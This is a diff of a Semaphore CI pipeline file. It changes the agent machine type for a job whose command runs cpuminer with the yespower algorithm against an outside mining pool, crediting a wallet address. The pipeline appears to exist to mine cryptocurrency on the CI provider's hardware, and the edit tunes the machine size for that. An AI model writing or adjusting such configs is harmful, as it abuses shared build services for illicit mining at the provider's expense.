@@ -20,7 +20,7 @@ blocks:
             - './cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.semaphore'
       agent:
         machine:
-          type: e1-standard-8
+          type: e2-standard-4
           os_image: ubuntu2004
 promotions:
   - name: Build app
